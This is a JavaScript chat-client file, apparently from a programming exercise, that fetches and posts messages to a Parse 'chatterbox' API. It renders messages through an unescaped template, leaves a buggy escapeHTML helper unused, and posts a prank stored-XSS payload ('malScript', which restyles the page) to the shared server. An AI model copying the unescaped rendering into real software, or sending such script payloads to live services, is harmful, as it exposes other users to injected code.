// YOUR CODE HERE:
/*$.ajax({
    // always use this url
    url: 'https://api.parse.com/1/classes/chatterbox',
    type: 'POST',
    data: JSON.stringify(message)
    contentType: 'application/json',
    success: function (data) {
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      // see: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to send message');
    }
});

$.ajax({
  url: 'https://api.parse.com/1/classes/chatterbox',
  type: 'GET',
  success: function(data){
    console.log('success', data);
  },
  error: function(data){
    console.log('error', data);
  }
});
/**/

var messageTemplate = "<p class='room'>Roomname: <%= roomname %></p><p class='user'>User: <%= username %></p><p class='message'> <%= text %></p><p class='time'>Time: <%= createdAt %>";

var renderChat = function(result){
  $('<li></li>').html(_.template(messageTemplate, result)).appendTo('.chats');  
}


var entityMap = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': '&quot;',
    "'": '&#39;',
    "/": '&#x2F;',
    "'": '"'
};

var escapeHTML = function(htmlString) {
  return String(htmlString).replace(/[&<>"'\/'"]/g, function (s) {
    return entityMap[s];
  });
};

var parseUndefines = function(object){
  _.each(object, function(val, key){
    if (val===undefined){
      object[key] = 'N/A';
    }
  });
  return object;
};

var parseGet = function(data){
  var results = data.results;
  _.each(results, function(result){
    renderChat(parseUndefines(result));
  });
};
 

$.getJSON('https://api.parse.com/1/classes/chatterbox',{order: '-createdAt'}, parseGet);

var malScript = "<script>console.log('wow, very much haxx, so insecure');$('div#main').css({'background-image':'url(http://www.pbh2.com/wordpress/wp-content/uploads/2013/11/doge-gif-zooms.gif)', 'background-size': '100%', 'background-repeat':'no-repeat'})</script>";

var malMessage = {
  username: 'totesHaxxxorz',
  text: malScript,
  roomname: 'chan'
};

var malJSON = JSON.stringify(malMessage);


$.ajax({
  url: 'https://api.parse.com/1/classes/chatterbox',
  type: 'POST',
  data: malJSON,
  contentType: 'application/json',
  success: function(data){
    console.log('success', data);
  },
  error: function(data){
    console.log('error', data);
  }
});
/*
$.ajax({
  url: 'https://api.parse.com/1/classes/chatterbox/Zr66wk3npp',
  type: 'DELETE',
  success: function(data){
    console.log(data);
  },
  error: function(data){
    console.log('error', data);
  }
});
/**/
